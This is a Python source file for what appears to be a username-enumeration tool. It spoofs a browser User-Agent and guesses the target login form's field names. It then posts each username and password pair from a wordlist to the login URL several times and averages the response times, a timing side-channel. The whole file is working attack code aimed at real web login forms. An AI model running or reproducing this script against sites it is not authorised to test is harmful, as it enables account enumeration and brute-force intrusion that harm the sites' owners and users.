# -*- coding: utf-8 -*-
import sys
import requests
import os.path
import validators
from utils import unpack
from argparser import args
from samplelists.formfields import userfields, passfields

class Requester():
    def __init__(self):
        # get parsed arguments
        self.args = args

        # define a fake headers to present ourself as Chromium browser, change if needed
        self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
        
        self.userfield, self.passfield = self.preflight_request(self.args.url)

    """
    Perform checks against possible username/password field names and get valid ones
    """
    def preflight_request(self, url):
        # perform target URL request one time
        data={'username': 'foo', 'password': 'foobar', "submit": "submit"}
        res = requests.post(url, headers=self.headers, data=data)
        print("[-] Finding valid user/pass field names...")

        # look for matching fieldnames from page source
        for x in range(len(userfields)):
            for y in range(len(passfields)):
                userfield='name="{}"'.format(userfields[x])
                passfield='name="{}"'.format(passfields[y])
                if userfield in res.text and passfield in res.text:
                    # TODO: implement caching system for valid fields
                    print("[+] Correct combination found! ", userfields[x], passfields[y])
                    return userfields[x], passfields[y]

    """
    Send POST request to endpoint based on known user/pass field name params
    """
    def do_average_post_request(self, url, userid, passwd, headers, rounds):       
        if not self.userfield and not self.passfield:
            return False
        else:
            data = {self.userfield: userid, self.passfield: passwd, "submit": "submit"}
            total_time = 0
            average_time = 0

            for x in range(rounds):
                res = requests.post(url, headers=headers, data=data)
                total_time += res.elapsed.total_seconds()

            average_time = total_time / rounds
            print("[+] user {:15}; rounds {}; average time {}".format(userid, rounds, average_time))
            # TODO: calculate max percentual change between requests and suggest greater n factor
        return True

    def send(self):
        # check if this script has been runned with an argument, and the argument exists and is a file
        if self.args.wordlist and (len(self.args.wordlist) > 1) and (os.path.isfile(self.args.wordlist)):
            fname = self.args.wordlist
        else:
            print("[!] Please provide a wordlist.")
            print("[-] Usage: python3 {} -w /path/to/wordlist".format(sys.argv[0]))
            sys.exit()

        if self.args.url and (len(self.args.url) > 1) and validators.url(self.args.url):
            url = self.args.url
        else:
            print("[!] Please provide a valid URL.")
            print("[-] Usage: python3 {} -u http://target.url".format(sys.argv[0]))
            sys.exit()

        with open(fname) as fh:
            # read file line by line
            for fline in fh:
                # skip line if it starts with a comment
                if fline.startswith("#"):
                    continue
                # extract userid and password from wordlist, removing trailing newline
                userid, passwd = unpack(fline.rstrip())

                # perform a number of rounds and get average time
                # TODO: implement multi-threading
                res = self.do_average_post_request(url, userid, passwd, self.headers, self.args.rounds)

if __name__ == "__main__":
    requester = Requester()
    requester.send()
        